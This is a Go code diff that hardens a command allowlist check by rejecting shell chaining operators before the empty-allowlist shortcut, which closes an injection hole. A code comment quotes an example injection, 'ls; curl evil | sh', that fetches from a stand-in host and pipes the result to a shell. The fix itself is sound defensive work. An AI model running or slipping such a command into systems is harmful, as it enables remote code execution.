@@ -100,20 +100,22 @@ func (inv *Investigator) SetCommandAllowlist(allowlist []string) {
 // Commands containing shell chaining operators (;, &&, ||, |, $, `) are always
 // rejected to prevent command injection through prefix matching.
 func (inv *Investigator) isCommandAllowed(command string) bool {
-	if len(inv.commandAllowlist) == 0 {
-		return true // backward compat
-	}
-
 	trimmed := strings.TrimSpace(command)
 	if trimmed == "" {
 		return false
 	}
 
-	// Reject commands containing shell chaining operators.
+	// Reject shell chaining operators FIRST, before the empty-allowlist
+	// short-circuit. Otherwise a config with an explicitly empty
+	// command_allowlist would allow injection like "ls; curl evil | sh".
 	for _, ch := range []string{";", "&&", "||", "|", "$(", "`", "\n"} {
 		if strings.Contains(trimmed, ch) {
 			return false
 		}
+	}
+
+	if len(inv.commandAllowlist) == 0 {
+		return true // backward compat: no allowlist configured = no prefix restriction
 	}
 
 	lower := strings.ToLower(trimmed)
